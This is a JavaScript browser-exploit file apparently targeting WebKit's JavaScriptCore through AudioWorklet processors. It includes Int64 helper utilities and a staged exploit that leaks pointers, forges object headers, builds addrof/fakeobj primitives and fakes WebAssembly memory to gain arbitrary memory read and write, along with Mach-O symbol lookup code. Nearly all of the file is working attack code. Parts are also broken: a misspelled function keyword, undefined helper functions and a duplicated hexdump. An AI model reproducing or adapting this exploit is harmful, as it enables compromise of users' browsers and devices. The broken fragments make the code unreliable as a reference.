debugger;
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

function print(s){
    alert(s);
}

// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ('0' + b.toString(16)).substr(-2);
    }
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}
// That's all the arithmetic we need for exploiting WebKit.. :)



function dec2hex(n) {
        if(n < 0) {
            n = 0xFFFFFFFF + n + 1;
        }
        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
    }
function hex2a(hex) {
var str = '';
for (var i = 0; i < hex.length; i += 2) {
    var v = parseInt(hex.substr(i, 2), 16);
    if (v) str += String.fromCharCode(v);
}
return str;
}
    function _u32(i)
{
    return b2u32(this.read(i, 4));
}

function fsyms(mem, base, segs, want, syms)
{
    want = Array.from(want); // copy
    if(syms === undefined)
    {
        syms = {};
    }

    var stab = null;
    alert1("here");
    var ncmds = memory.u32(Add(base, 0x10));
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = memory.u32(Add(base, off))
        if(cmd == 0x2) // LC_SYMTAB
        {
            var b = memory.read(Add(base, off + 0x8), 0x10);
            stab =
            {
                symoff:  b2u32(b.slice(0x8, 0xc)),
                nsyms:   b2u32(b.slice(0xc, 0x10)),
                stroff:  b2u32(b.slice(0x10, 0x14)),
                strsize: b2u32(b.slice(0x14, 0x18)),
            };
            break;
        }
        off += memory.u32(Add(base, off + 0x4));
    }
    if(stab == null)
    {
        fail("stab");
    }
    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
    var fn = function(i)
    {
        return memory.read(Add(tmp.base, tmp.off + i),0x10);
    };
    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
    {
        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
        for(var j = 0; j < want.length; ++j)
        {
            var s = want[j];
            if((strcmp(fn, s)))
            {
                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                want.splice(j, 1);
                break;
            }
        }
    }
    return syms;
}

var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
var VM_PROT_NONE = 0x0
var VM_PROT_READ = 0x1
var VM_PROT_WRITE = 0x2
var VM_PROT_EXECUTE = 0x4

unction b2u32(b){
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}
function hexdump(buffer, blockSize, base) {
    blockSize = blockSize || 16;
    var lines = [];
    var hex = "0123456789ABCDEF";
    for (var b = 0; b < buffer.length; b += blockSize) {
        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
        var codes = block.split('').map(function (ch) {
            var code = ch.charCodeAt(0);
            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
        }).join("");
        codes += "   ".repeat(blockSize - block.length);
        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
        chars +=  " ".repeat(blockSize - block.length);
        lines.push(addr + " " + codes + "  " + chars);
    }
    return lines.join("<br/>");
}

function mappedAddress(mapping, addr1) {
    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
    for (cc = 0; cc < mapping.length; ++cc) {
        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
            // >= <
            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
            //alert("debug-cacheoffset:" + cacheoffset)
            return cacheoffset;
        }
        else {
            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
        }
    }
}
function off2addr(mappings, off)
    {
  
        if(!(off instanceof Int64)) off = new Int64(off);
        for(var i = 0; i < mappings.length; ++i)
        {
            var start = mappings[i].fileoff; //cachestart
            var end   = Add(start, segs[i].size); //cacheend
           // alert("start" + start + "end" + end + "off" + off)
            if
            (
                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
            )
            {
                //print1ic = 1;
                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                return Add(mappings[i].addr, Sub(off, start));
            }

        }
        //return new Int64("0x4141414141414141");
    }

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => {
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => {
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
function change_container(header, arr){
    try{}
    catch{}
    for(var i = 0; i < 0x100000; i++){
        ds[i].cellHeader = header;
        ds[i].butterfly = arr;
    }
}
const MY_OBJECT_OFFSET = 0x14fb0;
//MakeJitCompiledFunction();
//MakeJitCompiledFunction();


var a= new Array(10);
for(var i = 0; i < 0x1000; i++)
  a[i]= Array(0x40).fill(0.0);
var b = Array(0x40).fill(0.0);
var c = Array(0x40).fill(0.0);
var ds = new Array(0x100000);

let noCoW =13.37
let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);



var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_1'] = 13.37;
let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

//var gcPreventer = [];
var structure_id = 0;
c[0] = 1.1;
var fuck = undefined;
var fuck2 = undefined;
var driver = undefined;
var stage = "leak"
var jscell_header = undefined;
var evil_arr_butterfly = undefined;
var expected_ptr = undefined;
eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);
b.process = (inputs, outputs, parameters)=>{
    //sa
    if(stage == "leak"){
        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
        expected_ptr = Number(expected_ptr);
        c[8] = qwordAsFloat(expected_ptr + 0x4010);
        c[9] = qwordAsFloat(0x0);
        stage  = "bypass_etc";
        fuck.port.postMessage(c);
        //sleep(4000);
        return true;
    }
    else if(stage == "bypass_etc"){
        //fuck.port.postMessage(typeof parameters);
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[0]);
        }
        jscell_header = gcPreventer[0];
        
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[1]);
        }
        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
        
        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
        if(structure_id == 0 ){
            fuck.port.postMessage(`retry`);
            
            c[8] = qwordAsFloat(0);
            parameters = null;
            //sleep(10000000);
            //stage = "leak";
            return false;
        }
        fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
        
        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
        //return false;
        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
        //change_container(cellHeader, evil_arr);
        c[8] = qwordAsFloat(evil_arr_butterfly);
        evil_arr[0] = cellHeader;
        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);

        stage = "r/w";
        return true;
    }
    else if(stage == "r/w"){
        for(var i =0; i < 2; i++){
            let a = i == 0 ? parameters: pad;
            a[0] = qwordAsFloat(0x133700001337);
        }
        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
        evil_arr[1] = qwordAsFloat(0);
        var boxed_offset = 0;
        for(var i = 0; i < evil_arr.length; i++){
            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
                boxed_offset = i;
                break;
            }
        }
        var addrof = (obj)=>{
            boxed[0] = obj;
            return floatAsQword(evil_arr[boxed_offset]);
        }
        var fakeObj = (addr)=>{
            evil_arr[boxed_offset] = qwordAsFloat(addr);
            return boxed[0];
        }
        stage="gc_test"
        return true;
    }
    else if(stage=="gc_test"){
        gc();
        fuck.port.postMessage("Garbage Collected");
        //sleep(100000);
        stage = "wasmfaker";
        return true;
    }
    else if (stage=="wasmfaker") {
    let fail = function fail(x)
    {
        fuck.port.postMessage('FAIL: ' + x);
        location.reload();
        throw null;
    }
        let print1 = fuck.port.postMessage();
        function foo(obj) {
   return delete obj['x'];
 }
// noInline(foo);
//foo(null);

  let o = {};

  for (let i = 0; i < 10000; ++i) {
   Object.defineProperty(o, 'x', {});
   foo({});
   foo({x:0x4141414141});
}
        //alert1("starting");
        print1('[*] Spraying structures to get a butterfly (1/2)...');
        // copy paste from: 
        // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
        var structs = [];
        for (var i = 0; i < 0x5000; i++) {
            var a = new Float64Array(1);
            a['prop' + i] = 1337;
            structs.push(a);
        }
        
        print1('[*] Spraying structures to get a butterfly (2/2)...');
        for (var i = 0; i < 500; i++) {
            var a = new WebAssembly.Memory({inital: 0});
            a['prop' + i] = 1339;
            structs.push(a);
        }
        
        print1('[*] Preparing R/W primitives...');
        
        var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
        var webAssemblyBuffer = str2ab(webAssemblyCode);
        var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
        
        var jsCellHeader = new Int64([
            0x00, 0x10, 0x00, 0x00,
            0x0,                    
            0x2c,                   
            0x08,                  
            0x1                     
        ]);
        
        var wasmBuffer = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: null,
            memory: null,
            deleteMe: null
        };
        
        var wasmInternalMemory = {
            jsCellHeader: null,
            memoryToRead: {}, 
            sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
            size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
            initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
            junk1: null,
            junk2: null,
            junk3: null,
            junk4: null,
            junk5: null,
        };
        
        var leaker = {
            objectToLeak: null
        };
        delete wasmBuffer.butterfly;
        delete wasmBuffer.vector;
        delete wasmBuffer.deleteMe;
        delete wasmInternalMemory.junk1;
        delete wasmInternalMemory.junk2;
        delete wasmInternalMemory.junk3;
        delete wasmInternalMemory.junk4;
        delete wasmInternalMemory.junk5;
        
        var realWasmMem = new WebAssembly.Memory({inital: 0x1});
        sleep(5);
        var wasmBufferRawAddr = addrof2(wasmBuffer);
        if (wasmBufferRawAddr == 0x7ff8000000000000) {
            //print1("[+] Got A NAN address which invalid reloading");
            fail("[+] Got A NAN address which is invalid ... reloading");
        }
        print1('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
        let u = new Int64(wasmBufferRawAddr).toString()[9];
        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
        var maxtry = 0;
        
        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
            print1('gotcha!');
            //continue;
        } else {
            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
            wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
            maxtry++;
            if (maxtry == 100000)
            {
                fail("wow 5000 tries on getting valid structid failed!!!");
            }
        }
            print1('[+] Successfully got fakeobj as WASMObject');
    } /*else {
        print1('[+] Successfully got fakeobj as WASMObject');
    }*/
        //print1('[+] Successfully got fakeobj as WASMObject');
        var wasmMemRawAddr = __addrof(wasmInternalMemory);
        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
        
        wasmBuffer.memory = wasmMem;
        
        var importObject = {
            imports: {
                mem: fakeWasmBuffer
            }
        };
        
        //print1('[*] We now have early R/W primitives that should work with the WASM memory...');
        
        function read_i64(readingFunc, offset) {
            var low = readingFunc(offset * 4);
            var midLow = readingFunc((offset * 4) + 1);
            var midHigh = readingFunc((offset * 4) + 2);
            var high = readingFunc((offset * 4) + 3);
            return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
        }
        function write_i64(writingFunc, offset, value) {
            writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
            writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
            writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
            writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
        }
        
        function createObjWriter(obj) {
            wasmInternalMemory.memoryToRead = obj;
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
    
        
        var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
        var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
        
        function createDirectWriter(address) {
            wasmInternalBufferWriter.write_i64(1, address);
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
        
        var realWasmWriter = createObjWriter(realWasmMem);
        var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
        wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
        /*for (var z = 0; z < 10000; z++) {
            var chewjittime = [0x7fff000000000000];
            chewjittime[1] = {a:0x41312111};
        }*/
        var leakerWriter = createObjWriter(leaker);
        wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
        var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
        importObject.imports.mem = realWasmMem;
        
        addrof = function(obj) {
            leaker.objectToLeak = obj;
            return leakerWriter.read_i64(2);
        }
        
        fakeobj = function(addr) {
            leakerWriter.write_i64(2, addr);
            return leaker.objectToLeak;
        }
        
        createObjWriter = function(obj) {
            return createDirectWriter(addrof(obj));
        }
        
        var writer = createObjWriter(wasmMem);
        writer.write_i64(0, Int64.One);
        var wasmBufferWriter = createObjWriter(wasmBuffer);
        var writer = createObjWriter(wasmInternalMemory);
        wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); 
        wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
        
        writer.write_i64(4, Int64.Zero);
        writer.write_i64(5, Int64.Zero);
        writer.write_i64(6, Int64.Zero);
        writer.write_i64(7, Int64.Zero);
        writer.write_i64(0, new Int64('0x0000000000000007'));
        writer.write_i64(2, new Int64('0x0000000000000007'));
        
        print1('[*] We now have stable R/W primitives, hooray!');
        var memory = {
            create_writer: function(addrObj) {
                if (addrObj instanceof Int64) {
                    var writer = createDirectWriter(addrObj);
                    return writer;
                } else {
                    var writer = createObjWriter(addrObj);
                    return writer;
                }
            },
            read_i64: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i64(offset);
            },
            write_i64: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i64(offset, value);
            },
            read_i32: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return new Int64(writer.read_i32(offset));
            },
            write_i32: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i32(offset, value);
            },
            read_i8: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i8(offset);
            },
            write_i8: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i8(offset, value);
            },
            write: function(addrObj, data, length) {
                var offset = 0;
                var writer = this.create_writer(addrObj);
                for (var i = 0; i < length; i++) {
                    writer.write_i8(offset + i, data[i]);
                }
            },
            read: function(addrObj, length) {
                var offset = 0;
                var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = writer.read_i8(offset + i);
                }
                return arr;
            },
            readInt64: function(addrObj) {
                //var offset = 0;
                //var writer = this.create_writer(addrObj);
                return this.read_i64(addrObj,0);
            },
            writeInt64: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i64(offset, value);
            },
            copyfrom: function(addrObj, offset, length) {
                offset = 0;
                var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = writer.read_i8(offset + i);
                }
                return arr;
            },
            write_non_zero: function(where, what) {
            for (var i = 0; i < what.length; ++i) {
                if (what[i] != 0) {
                        this.write_i64(where + i*8, 0, what[i])
                }
            }
           },
        }
        stage = "parsecache";
        return true;
    }
    else if(stage =="parsecache") {
        
    }
    //  sleep(2000);
    return true;
}
class OrigineWorklet extends AudioWorkletProcessor {
    constructor(){
        super();
        //var fuck2 = new AudioWorkletProcessor();
        return b;
    }
    static get parameterDescriptors() {
        return []
    }
    process (inputs, outputs, parameters) {
        
        return false;
    }
}
class OrigineWorklet2 extends AudioWorkletProcessor {
    constructor(){
        super();
        //console.log(c);
        this.port.onmessage = (e)=>{
        }
        
        fuck = this;
        //fuck.port.postMessage(c);
        return this;
    }
    static get parameterDescriptors() {
        return [{
            name: 'param2',
            defaultValue: 0.1337
        }];
    }
    process (inputs, outputs, parameters) {
        //
        //
        //this.port.postMessage(c);
        return false;
    }
}
registerProcessor('OrigineWorklet', OrigineWorklet);
registerProcessor('OrigineWorklet2', OrigineWorklet2);
